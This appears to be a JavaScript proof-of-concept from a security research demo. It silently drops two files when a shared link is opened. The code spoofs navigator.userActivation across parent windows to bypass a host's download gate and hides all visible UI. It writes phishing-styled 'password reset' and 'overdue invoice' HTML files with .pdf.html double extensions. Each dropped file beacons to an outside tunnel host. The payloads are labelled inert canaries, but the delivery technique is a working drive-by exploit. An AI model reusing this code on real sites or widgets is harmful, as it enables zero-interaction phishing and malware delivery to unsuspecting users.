/* T71-PART2 - SILENT DUAL-FILE DROPPER, ZERO UI (Pluto Security, inert canary).
   For the second demonstration video: the shared link is opened, NO app UI
   appears at all (the widget collapses to an invisible sliver), and TWO
   files land silently in ~/Downloads:
     load #1 -> "ChatGPT_Password_Reset_Required.pdf.html"  (reset-page look)
     ~3s later a single page reload re-arms the one-shot download
     load #2 -> "Invoice_Overdue_October_2026.pdf.html"      (overdue-invoice look)
   Both files are clearly-labeled inert canary pages that beacon to OUR OWN
   receiver when opened. Nothing real. The names are attacker-chosen
   curiosity bait - the demo point: files land with zero interaction. */
(function () {
  var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
  var EPOCH = 1792678200;
  function log(m) { try { console.log("[T71P2] " + m + " @" + Date.now()); } catch (e) {} }
  log("PART2 silent dual-drop, epoch " + EPOCH);

  /* spoof userActivation on every same-origin window (T11-proven; the
     host download interceptor's gate reads the runner realm) */
  function spoofChain() {
    var w = window, n = 0;
    for (var i = 0; i < 6; i++) {
      try {
        Object.defineProperty(w.navigator, "userActivation", {
          get: function () { return { isActive: true, hasBeenActive: true }; },
          configurable: true
        });
        n++;
      } catch (e) {}
      try { var p = w.parent; if (!p || p === w) break; w = p; } catch (e) { break; }
    }
    return n;
  }

  /* which file this page-load drops (sessionStorage alternation) */
  var step = 1;
  try { if (sessionStorage.getItem("t71p2") === "1") step = 2; } catch (e) {}
  log("load step " + step + " (spoof " + spoofChain() + " windows)");

  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }

  function buildFile() {
    var tok = "T71P2-" + EPOCH + "-s" + step;
    var name, inner;
    if (step === 1) {
      name = "ChatGPT_Password_Reset_Required.pdf.html";
      inner =
        "<h2 style=\"font-weight:600\">Password reset required</h2>" +
        "<p style=\"color:#666\">We detected a suspicious sign-in attempt on your account. A password reset is required within 24 hours.</p>" +
        "<p style=\"color:#c00;font-size:11px;font-family:Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT</p>";
    } else {
      name = "Invoice_Overdue_October_2026.pdf.html";
      inner =
        "<h2 style=\"font-weight:600\">Invoice overdue - action required</h2>" +
        "<p style=\"color:#666\">Invoice #INV-2026-0987 is 14 days overdue. Amount due: <b>$258.00</b>. Please review the attached notice.</p>" +
        "<p style=\"color:#c00;font-size:11px;font-family:Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT</p>";
    }
    var beacon = encodeURIComponent(tok + "|file=" + name);
    var html = [
      "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>" + esc(name.replace(/\\.pdf\\.html$/, "")) + "</title></head>",
      "<body style=\"font:14px -apple-system,Helvetica,Arial,sans-serif;background:#fff;color:#111;padding:24px;max-width:520px\">",
      inner,
      "<pre id=\"out\" style=\"font:11px Menlo,monospace\"></pre>",
      "<script>",
      "var R = \"" + R + "\";",
      "function log(m){var o=document.getElementById('out');o.textContent+='\\\\n'+m;}",
      "log('opened as file:// at '+Date.now()+' (no warning shown)');",
      "try{fetch(R+'" + beacon + "-fetch').then(function(r){log('FETCH BEACON SENT status='+r.status);}).catch(function(e){log('fetch blocked '+e.message);});}catch(e){}",
      "var i=new Image();i.onload=function(){log('IMG BEACON SENT');};i.onerror=function(){};",
      "i.src=R+'" + beacon + "-img';",
      "<\/script></body></html>"
    ].join("");
    return { name: name, html: html };
  }

  function boot() {
    var d = document;
    /* NO UI AT ALL: hide everything the loader/app rendered (this payload
       draws nothing), collapse the widget to an invisible sliver */
    var spacer = d.createElement("div");
    function hideAlien() {
      for (var i = 0; i < d.body.children.length; i++) {
        var c = d.body.children[i];
        if (c !== spacer) c.style.display = "none";
      }
    }
    hideAlien();
    try {
      new MutationObserver(function () { hideAlien(); })
        .observe(d.body, { childList: true });
    } catch (e2) {}
    spacer.style.cssText = "position:static;width:1px;height:1px;pointer-events:none;";
    d.body.appendChild(spacer);
    log("UI hidden (zero-visibility mode)");

    /* silent write via the host download bootstrap (T66-proven) */
    var f = buildFile();
    try {
      var blob = new Blob([f.html], { type: "text/html" });
      var url = URL.createObjectURL(blob);
      var a = d.createElement("a");
      a.href = url;
      a.download = f.name;
      a.style.display = "none";
      d.body.appendChild(a);
      a.click();
      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
      log("WRITE FIRED: " + f.name);
    } catch (e) { log("write ERR " + e.message); }

    /* step 1: single quiet reload re-arms the one-shot interceptor for file 2 */
    if (step === 1) {
      try { sessionStorage.setItem("t71p2", "1"); } catch (e) {}
      setTimeout(function () {
        log("reloading once to drop file 2...");
        try { location.reload(); } catch (e) { log("reload ERR " + e.message); }
      }, 3000);
    } else {
      try { sessionStorage.removeItem("t71p2"); } catch (e) {}
      log("both files delivered - done");
    }
  }

  if (document.body) boot();
  else if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else { var iv = setInterval(function () { if (document.body) { clearInterval(iv); boot(); } }, 50); }
})();
